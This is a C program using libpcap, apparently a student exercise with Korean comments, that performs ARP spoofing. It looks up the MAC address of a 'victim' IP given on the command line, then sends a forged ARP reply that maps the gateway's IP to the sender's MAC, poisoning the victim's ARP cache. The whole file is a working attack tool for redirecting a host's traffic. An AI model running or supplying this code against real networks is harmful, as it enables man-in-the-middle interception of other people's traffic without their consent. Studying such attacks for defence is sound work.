#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<string.h>
#include<netinet/ether.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap/pcap.h>
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARPHRD_ETHER 1
#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2
#define BUFF_SIZE 20

void make_arp_packet(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC, const struct in_addr targIP, const struct ether_addr targMAC, uint16_t arpop);


int main(int argc, char *argv[])
{
	const u_char *recv_packet;
	const u_char *userData;
	char my_ip_buff[BUFF_SIZE];
	char my_mac_buff[BUFF_SIZE];
	char gate_buff[BUFF_SIZE];
	char errbuf[PCAP_ERRBUF_SIZE];
	char *DevName;
	int i;
	struct ether_addr mMac;
	struct ether_addr vMac;
	struct ether_addr bMac;
	struct in_addr myIP;
	struct in_addr gatewayIP;
	struct in_addr victimIP;
	struct ether_arp *recvArphdr;
	struct ether_header *recvEthdr;
	struct pcap_pkthdr pkthdr;
	struct pcap_pkthdr *recv_pkthdr;
	pcap_t* ID;
	FILE *fp;

	//자신의 네트워크 정보수집
	
	fp = popen("ifconfig -a | grep 'inet' | grep 'Bcast:' | awk '{print $2}' | awk -F: '{print $2}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen1() 실패");
		return -1;
	}
	fgets(my_ip_buff,BUFF_SIZE,fp);
	fclose(fp);
	inet_aton(my_ip_buff, &myIP);

	fp = popen("ifconfig -a | grep 'HWaddr' | awk '{print $5}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen2() 실패");
		return -1;
	}
	fgets(my_mac_buff,BUFF_SIZE,fp);
	fclose(fp);
	ether_aton_r(my_mac_buff, &mMac);

	fp = popen("route |grep 'default' | awk '{print $2}'", "r");
   	if ( NULL == fp)
	{
		perror( "popen3() 실패");
		return -1;
	}
	fgets(gate_buff,BUFF_SIZE,fp);
	fclose(fp);
	inet_aton(gate_buff, &gatewayIP);


	DevName = pcap_lookupdev(errbuf);
	if(DevName==0)
	{
		printf("Error : [%s]\n", errbuf);
		return 1;
	}
	printf("Network Device Name : [%s]\n", DevName);
	ID = pcap_open_live(DevName, 1024, 1, -1, errbuf);
	inet_aton(argv[1], &victimIP);
	ether_aton_r("ff:ff:ff:ff:ff:ff", &bMac);
	u_char Packet1[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	make_arp_packet(Packet1, myIP, mMac, victimIP, bMac, ARP_OP_REQUEST); 
	while(1)
	{	
		pcap_sendpacket(ID, Packet1, sizeof(struct ether_header) + sizeof(struct ether_arp));
		i= pcap_next_ex(ID, &recv_pkthdr, &recv_packet);
		printf("1...\n");
		printf("%d \n", i);
		if(i!=1)
		{
			printf("recv Error\n");
			continue;
		}
		printf("2...\n");
		recvEthdr=(struct ether_header *)recv_packet;
		if(recvEthdr->ether_type!=htons(ETHERTYPE_ARP))
		{
			printf("not arp packet\n");
			continue;
		}
		recvArphdr = (struct ether_arp *)(recv_packet + sizeof(struct ether_header));
		if(memcmp(&recvArphdr->arp_spa, &victimIP, 4)!=0)
		{
			printf("not victim arp packet\n");
			continue;
		}
		printf("3...\n");
		memcpy(&vMac, &recvArphdr->arp_sha, 6);
		break;
	} // arp request로 victim mac 주소 가져오기
	printf("while문 완료");

	u_char Packet2[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	make_arp_packet(Packet2, gatewayIP, mMac, victimIP, vMac, ARP_OP_REPLY);
	pcap_sendpacket(ID, Packet2, sizeof(struct ether_header) + sizeof(struct ether_arp));
	pcap_close(ID);
	return 0;
	//..........
}

void make_arp_packet(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC, const struct in_addr targIP, const struct ether_addr targMAC, uint16_t arpop)
{
	struct ether_arp arphdr;
	struct ether_header ethdr;
	ethdr.ether_type = htons(ETHERTYPE_ARP);
	memcpy(ethdr.ether_dhost, &targMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(ethdr.ether_shost, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
	arphdr.arp_hrd = htons(ARPHRD_ETHER);
	arphdr.arp_pro = htons(ETHERTYPE_IP);
	arphdr.arp_hln = ETHER_ADDR_LEN;
	arphdr.arp_pln = sizeof(4);
	arphdr.arp_op = htons(arpop);
	memcpy(&arphdr.arp_sha, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arphdr.arp_spa, &sendIP.s_addr, sizeof(4));
	memcpy(&arphdr.arp_tha, &targMAC.ether_addr_octet, ETHER_ADDR_LEN);
	memcpy(&arphdr.arp_tpa, &targIP.s_addr, sizeof(4));
	memcpy(packet, &ethdr, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arphdr, sizeof(struct ether_arp));
	return;
}
